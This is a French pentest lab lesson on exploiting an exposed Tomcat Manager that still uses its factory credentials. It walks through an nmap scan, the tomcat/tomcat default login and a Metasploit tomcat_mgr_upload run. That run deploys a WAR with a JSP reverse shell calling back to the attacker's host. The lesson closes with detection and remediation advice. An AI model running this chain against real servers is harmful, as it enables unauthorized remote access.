Tomcat Manager
Creds + WAR

Le gestionnaire d'administration de Tomcat est fait pour déployer du code. S'il est accessible avec ses identifiants d'usine, il devient le chemin le plus court vers l'exécution de commandes.

Cinq étapes : identifier le service, comprendre ce que le manager autorise, s'y authentifier, déployer une archive piégée, et constater le niveau d'accès réel obtenu.

1

Identifier le serveur d'application

Tomcat écoute ici sur le port 8180 — on cible directement ce port pour confirmer le service et sa version.

kali@kali
$ nmap -sV -p 8180 192.168.56.20
PORT     STATE SERVICE VERSION
8180/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
Tomcat/CoyoteCoyote est le connecteur HTTP de Tomcat. La version 1.1 confirme un serveur ancien et probablement non durci. à retenirContrairement à vsftpd ou distccd, on ne cherche pas ici une faille dans le code du service. On cherche un panneau d'administration exposé.
2

Comprendre ce qu'est le manager Tomcat

Le Tomcat Web Application Manager est une interface d'administration accessible via une URL dédiée.

kali@kali
URL typique : http://<cible>:8180/manager/html
→ Demande un couple login / mot de passe.
→ Une fois authentifié, permet d'uploader et déployer des applications web (fichiers .war, .jar).
→ Ces applications s'exécutent avec les droits du compte de service Tomcat.
légitimeDéployer une WAR est le but premier de ce gestionnaire : c'est un outil d'administration, pas une faille. Le vrai problème est l'accès à cet outil. barrièreUne page de login apparaît. Sans identifiants valides, impossible d'aller plus loin. C'est une différence majeure avec distccd, qui n'exigeait aucune authentification. creds par défautL'installation fournit des identifiants par défaut : tomcat / tomcat. Sur un serveur non durci, ils n'ont jamais été changés.

Automatiser l'attaque avec Metasploit

Le module tomcat_mgr_upload gère l'authentification, fabrique une archive WAR contenant un payload, et la déploie.

kali@kali
$ msfconsole

msf > use exploit/multi/http/tomcat_mgr_upload

RHOSTS => 192.168.56.20
msf exploit(tomcat_mgr_upload) > set RPORT 8180
RPORT => 8180
msf exploit(tomcat_mgr_upload) > set HttpUsername tomcat
HttpUsername => tomcat
msf exploit(tomcat_mgr_upload) > set HttpPassword tomcat
HttpPassword => tomcat
msf exploit(tomcat_mgr_upload) > run
[*] Started reverse TCP handler on 192.168.56.10:4444 
[*] Automatically selected target: Java Universal
[*] Uploading payload...
[*] Deploying payload...
[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.20:52134)
moduleLe chemin multi/http signifie que le module gère plusieurs chemins d'accès au manager. Il utilise les variables HttpUsername et HttpPassword pour s'authentifier. RPORTLe port du manager sur cette cible est 8180, à préciser dans la configuration du module. payloadLe payload par défaut java/jsp_shell_reverse_tcp est une page JSP malveillante encapsulée dans un fichier WAR. Une fois déployée, cette page renvoie un shell à l'attaquant. déploiementLe module ne contourne aucun filtre : il utilise l'API légitime du manager. C'est précisément parce que le manager est fait pour ça que l'attaque fonctionne.
4

Vérifier le niveau d'accès obtenu

La session est ouverte, mais avec quel utilisateur ? C'est la première question à se poser après toute exploitation.

shell
$ whoami
tomcat55
tomcat55Le shell s'exécute avec les droits du compte de service Tomcat, ici tomcat55. Ce n'est pas root. distinctionvsftpd renvoyait directement un shell root. Ici, l'accès est limité à l'utilisateur applicatif. Il faudra une étape supplémentaire (voir cours #26) pour élever les privilèges. pourquoiTomcat, comme tout service bien configuré, ne devrait pas tourner en root. Le compte de service limite l'impact d'une compromission — une bonne pratique, même si elle ne rattrape pas la faiblesse des identifiants.

Ce qu'il faut vraiment comprendre

La frontière entre administration légitime et attaque

Tomcat Manager est conçu pour déployer du code. Une fois authentifié, y parvenir est un usage normal. L'attaque ne détourne pas une fonctionnalité : elle exploite l'accès à cette fonctionnalité. La différence avec un contournement de filtre (DVWA Upload) est fondamentale.

Identifiants par défaut : la barrière en carton

Le contraste avec distccd est net. Là-bas, aucun contrôle d'accès — le service était ouvert. Ici, un contrôle d'accès existe, mais il a été laissé à sa valeur d'usine. C'est une faille de configuration, pas d'implémentation.

Compte de service, pas root

Le shell retourné appartient à tomcat55. C'est une bonne pratique de sécurité : le service ne tourne pas en root, ce qui limite les dégâts. Mais cela signifie aussi que l'accès obtenu n'est pas total — le cours #26 (SUID) ou #27 (kernel) seront nécessaires pour élever les privilèges.

Anatomie — contraste avec distccd et DVWA Upload

Deux cours à ne pas confondre avec celui-ci : l'un n'avait aucune barrière, l'autre en avait une à contourner. Ici, la barrière est simplement mal fermée.

distccd (#9) — aucune barrière

distccd exposait une fonction d'exécution de commandes sans exiger le moindre identifiant. La faille était l'absence totale de restriction d'accès. Ici, le manager Tomcat impose une authentification : il y a bien une barrière, mais elle utilise le couple tomcat:tomcat par défaut.

DVWA Upload (#21) — contourner un filtre

DVWA Upload demandait de contourner un filtre d'extension sur une application volontairement vulnérable. Ici, il n'y a aucun filtre à contourner : l'upload de WAR est une fonctionnalité d'administration légitime, utilisée telle quelle. La seule chose qui manque, c'est le durcissement des identifiants.

Le point commun des trois : configuration vs code

Aucune des trois attaques n'exploite un bug dans le code. distccd = service mal configuré, Tomcat = identifiants par défaut, DVWA = filtre absent (mais l'application est faite pour être vulnérable). La leçon : en pentest, on cherche souvent moins un bug qu'une mauvaise configuration.

Détection & remédiation

Ce qui aurait empêché l'attaque, et comment la repérer.

Changer les identifiants par défautmodifier tomcat-users.xml et supprimer le rôle manager-gui pour l'utilisateur par défaut — la mesure la plus simple et la plus efficace
Restreindre l'accès au managerfiltrer par IP (pare-feu, RemoteAddrValve) pour n'autoriser que les postes d'administration
Désactiver le manager en productionsi le déploiement ne se fait pas via cette interface, la supprimer ou la désactiver réduit la surface d'attaque à zéro
Surveiller les déploiements de WARjournaliser et alerter sur tout déploiement non planifié — un WAR inconnu est un signal fort

Terminal d'entraînement

Rejoue la chaîne complète : identification, compréhension, exploitation, et vérification du niveau d'accès. Le shell retourné n'est pas root — c'est justement l'occasion de s'en rendre compte.
